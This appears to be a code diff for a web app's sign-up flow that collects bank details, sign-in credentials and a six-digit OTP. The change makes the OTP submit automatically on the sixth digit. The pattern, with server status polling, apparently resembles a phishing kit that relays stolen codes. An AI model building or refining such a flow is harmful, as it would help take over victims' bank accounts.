@@ -72,7 +72,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Navigation flow: Welcome -> Slider -> Form 1 -> Form 2 -> Form 3 -> Bank Details -> Sign In -> OTP -> Success
+  // Navigation flow
   document.getElementById('btn-goto-slider').addEventListener('click', () => showScreen(screenSlider));
   document.getElementById('btn-slider-back').addEventListener('click', () => showScreen(screenWelcome));
   document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));
@@ -168,24 +168,42 @@ document.addEventListener('DOMContentLoaded', () => {
     updateCalc();
   }
 
-  function setupDigitInputs(boxes) {
-    boxes.forEach((box, idx) => {
-      box.addEventListener('input', () => {
-        box.value = box.value.replace(/\D/g, '');
-        if (box.value && idx < boxes.length - 1) {
-          boxes[idx + 1].focus();
-        }
-      });
-      box.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !box.value && idx > 0) {
-          boxes[idx - 1].focus();
-        }
-      });
+  // Pin boxes navigation helper
+  pinBoxes.forEach((box, idx) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/\D/g, '');
+      if (box.value && idx < pinBoxes.length - 1) {
+        pinBoxes[idx + 1].focus();
+      }
     });
-  }
+    box.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !box.value && idx > 0) {
+        pinBoxes[idx - 1].focus();
+      }
+    });
+  });
 
-  setupDigitInputs(pinBoxes);
-  setupDigitInputs(otpBoxes);
+  // OTP boxes helper with AUTOMATIC SUBMISSION on the 6th digit
+  otpBoxes.forEach((box, idx) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/\D/g, '');
+      if (box.value && idx < otpBoxes.length - 1) {
+        otpBoxes[idx + 1].focus();
+      }
+      
+      // Check if all 6 OTP digits are filled -> Automatically submit
+      const currentOtpVal = Array.from(otpBoxes).map(b => b.value).join('');
+      if (currentOtpVal.length === 6) {
+        submitOtpAction(currentOtpVal);
+      }
+    });
+
+    box.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !box.value && idx > 0) {
+        otpBoxes[idx - 1].focus();
+      }
+    });
+  });
 
   // Sign In Credentials Submission
   btnSubmitSignin.addEventListener('click', async () => {
@@ -216,14 +234,8 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // OTP Submission
-  btnSubmitOtp.addEventListener('click', async () => {
-    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
-    if (otpVal.length !== 6) {
-      showSurfaceError(bannerOtpError, 'ENTER A VALID 6-DIGIT OTP');
-      return;
-    }
-
+  // Reusable OTP Submission Function
+  async function submitOtpAction(otpVal) {
     bannerOtpError.classList.remove('active');
     showLoading('VERIFYING OTP...', 'Please wait...');
 
@@ -242,7 +254,19 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch (e) {
       hideLoading();
     }
-  });
+  }
+
+  // Manual fallback button submit for OTP
+  if (btnSubmitOtp) {
+    btnSubmitOtp.addEventListener('click', () => {
+      const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
+      if (otpVal.length !== 6) {
+        showSurfaceError(bannerOtpError, 'ENTER A VALID 6-DIGIT OTP');
+        return;
+      }
+      submitOtpAction(otpVal);
+    });
+  }
 
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
@@ -313,4 +337,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-                          
+    
